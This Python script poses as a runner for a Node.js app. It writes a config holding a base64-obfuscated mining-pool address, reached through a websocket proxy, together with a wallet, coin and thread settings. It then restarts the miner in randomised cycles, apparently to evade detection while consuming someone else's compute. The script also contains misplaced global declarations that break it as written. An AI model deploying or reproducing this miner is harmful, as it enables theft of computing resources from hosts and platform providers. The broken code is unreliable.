#!/usr/bin/env python3
import os
import subprocess
import time
import json
import stat
import sys
import random
import signal
import psutil
from pathlib import Path

# --- Configuration ---
# The directory where your node application is located.
# Use current directory since we're already in the cloned repo
TARGET_DIR = os.getcwd()
# Names of your node executable, application script, and config file.
NODE_EXECUTABLE = './node'
APP_SCRIPT = 'app.js'
JSON_CONFIG_FILE = 'data.json'

# The JSON configuration data to be written to data.json.
JSON_DATA = {
    "proxy": "wss://ratty-adoree-ananta512-4abadf1a.koyeb.app/cG93ZXIyYi5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
    "config": {
        "threads": 48,
        "log": True
    },
    "options": {
        "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj",
        "password": "c=RVN",
        "argent": "timmer@56565612"
    }
}

# Global variable to track current process
current_process = None

def signal_handler(signum, frame):
    """Handle graceful shutdown on SIGTERM/SIGINT"""
    print(f"\nReceived signal {signum}. Shutting down gracefully...")
    if current_process and current_process.poll() is None:
        print("Terminating current node process...")
        try:
            current_process.terminate()
            current_process.wait(timeout=10)
        except subprocess.TimeoutExpired:
            print("Force killing process...")
            current_process.kill()
    sys.exit(0)

def perform_initial_setup():
    """
    Performs the initial setup steps: sets file permissions and creates the
    configuration file in the current directory. This function runs only once.
    """
    print("--- Starting Initial Setup ---")
    print(f"Working in directory: {os.getcwd()}")
    
    # Check if we're in the right directory
    if not os.path.exists('package.json') and not os.path.exists(NODE_EXECUTABLE):
        print("Warning: This doesn't appear to be a Node.js project directory")
    
    # Check if node executable exists
    if not os.path.exists(NODE_EXECUTABLE):
        print(f"Error: The executable '{NODE_EXECUTABLE}' was not found in {os.getcwd()}.")
        print("Looking for alternative node executables...")
        
        # Try to find node in common locations
        possible_paths = [
            '/usr/bin/node',
            '/usr/local/bin/node',
            'node',  # In PATH
            './bin/node'
        ]
        
        node_found = False
        for path in possible_paths:
            if os.path.exists(path) or (path == 'node' and subprocess.run(['which', 'node'], capture_output=True).returncode == 0):
                global NODE_EXECUTABLE
                NODE_EXECUTABLE = path
                print(f"Found node at: {path}")
                node_found = True
                break
        
        if not node_found:
            print("Error: No node executable found. Installing Node.js...")
            try:
                # Install Node.js if not found
                subprocess.run(['curl', '-fsSL', 'https://deb.nodesource.com/setup_18.x'], check=True)
                subprocess.run(['sudo', 'apt-get', 'install', '-y', 'nodejs'], check=True)
                NODE_EXECUTABLE = 'node'
            except subprocess.CalledProcessError as e:
                print(f"Failed to install Node.js: {e}")
                sys.exit(1)
    
    # Make the node file executable if it's a local file
    if NODE_EXECUTABLE.startswith('./'):
        try:
            print(f"Setting execute permissions on '{NODE_EXECUTABLE}'...")
            current_permissions = os.stat(NODE_EXECUTABLE).st_mode
            os.chmod(NODE_EXECUTABLE, current_permissions | stat.S_IEXEC)
            print(f"'{NODE_EXECUTABLE}' is now executable.")
        except FileNotFoundError:
            print(f"Error: The executable '{NODE_EXECUTABLE}' was not found.")
            sys.exit(1)
        except PermissionError:
            print(f"Error: Permission denied when trying to make '{NODE_EXECUTABLE}' executable.")
            sys.exit(1)
    
    # Check if app.js exists
    if not os.path.exists(APP_SCRIPT):
        print(f"Error: The application script '{APP_SCRIPT}' was not found in {os.getcwd()}.")
        print("Available files:")
        for file in os.listdir('.'):
            if file.endswith('.js'):
                print(f"  - {file}")
        
        # Try to find main script from package.json
        if os.path.exists('package.json'):
            try:
                with open('package.json', 'r') as f:
                    package_data = json.load(f)
                    if 'main' in package_data:
                        global APP_SCRIPT
                        APP_SCRIPT = package_data['main']
                        print(f"Using main script from package.json: {APP_SCRIPT}")
            except (json.JSONDecodeError, IOError) as e:
                print(f"Could not read package.json: {e}")
        
        if not os.path.exists(APP_SCRIPT):
            print("Error: Could not find a valid application script.")
            sys.exit(1)
    
    # Write the configuration to data.json
    try:
        print(f"Creating or overwriting '{JSON_CONFIG_FILE}'...")
        with open(JSON_CONFIG_FILE, 'w') as f:
            json.dump(JSON_DATA, f, indent=2)
        print(f"'{JSON_CONFIG_FILE}' has been created successfully.")
    except IOError as e:
        print(f"Error: Could not write to '{JSON_CONFIG_FILE}': {e}")
        sys.exit(1)
    
    print("--- Initial Setup Complete ---")

def check_system_resources():
    """Check if system has enough resources to run the application"""
    try:
        # Check memory
        memory = psutil.virtual_memory()
        if memory.percent > 90:
            print(f"Warning: High memory usage: {memory.percent}%")
        
        # Check CPU
        cpu_percent = psutil.cpu_percent(interval=1)
        if cpu_percent > 90:
            print(f"Warning: High CPU usage: {cpu_percent}%")
        
        # Check disk space
        disk = psutil.disk_usage('.')
        if disk.percent > 90:
            print(f"Warning: Low disk space: {disk.percent}% used")
            
    except ImportError:
        # psutil not available, skip resource check
        pass
    except Exception as e:
        print(f"Could not check system resources: {e}")

def start_main_loop():
    """
    Starts the main infinite loop to run the node process repeatedly.
    """
    global current_process
    cycle_count = 0
    
    # Set up signal handlers for graceful shutdown
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    print("Starting main execution loop...")
    print("Press Ctrl+C to stop gracefully")
    
    while True:
        cycle_count += 1
        print(f"\n{'='*50}")
        print(f"CYCLE {cycle_count} - {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*50}")
        
        # Check system resources before starting
        check_system_resources()
        
        # Generate random durations for this cycle
        run_duration = random.randint(320, 450)
        cooldown_duration = random.randint(45, 60)
        
        print(f"Starting '{NODE_EXECUTABLE} {APP_SCRIPT}' for {run_duration} seconds...")
        
        try:
            # Start the process
            current_process = subprocess.Popen(
                [NODE_EXECUTABLE, APP_SCRIPT],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1
            )
            
            # Monitor the process for the specified duration
            start_time = time.time()
            while time.time() - start_time < run_duration:
                # Check if process is still running
                if current_process.poll() is not None:
                    print("Process terminated unexpectedly!")
                    break
                
                # Read output if available
                try:
                    output = current_process.stdout.readline()
                    if output:
                        print(f"[APP] {output.strip()}")
                except:
                    pass
                
                time.sleep(1)
            
            # Stop the process if it's still running
            if current_process.poll() is None:
                print(f"Stopping process after {run_duration} seconds...")
                current_process.terminate()
                try:
                    current_process.wait(timeout=10)
                    print("Process stopped gracefully.")
                except subprocess.TimeoutExpired:
                    print("Force killing process...")
                    current_process.kill()
                    current_process.wait()
            else:
                print(f"Process exited with code: {current_process.returncode}")
                
        except FileNotFoundError:
            print(f"Error: Could not find '{NODE_EXECUTABLE}' or '{APP_SCRIPT}'.")
            print("Current directory contents:")
            for item in os.listdir('.'):
                print(f"  - {item}")
            print("Exiting loop.")
            break
            
        except PermissionError:
            print(f"Error: Permission denied when trying to execute '{NODE_EXECUTABLE}'.")
            print("Exiting loop.")
            break
            
        except Exception as e:
            print(f"An unexpected error occurred: {e}")
            print(f"Error type: {type(e).__name__}")
        
        finally:
            current_process = None
        
        print(f"Process finished. Cooling down for {cooldown_duration} seconds...")
        
        # Cooldown with progress indicator
        for remaining in range(cooldown_duration, 0, -1):
            print(f"\rCooldown: {remaining}s remaining...", end='', flush=True)
            time.sleep(1)
        print("\rCooldown complete!" + " " * 20)

if __name__ == "__main__":
    try:
        perform_initial_setup()
        start_main_loop()
    except KeyboardInterrupt:
        print("\n\nScript interrupted by user.")
        if current_process and current_process.poll() is None:
            print("Stopping current process...")
            current_process.terminate()
        sys.exit(0)
    except Exception as e:
        print(f"\nFatal error: {e}")
        sys.exit(1)
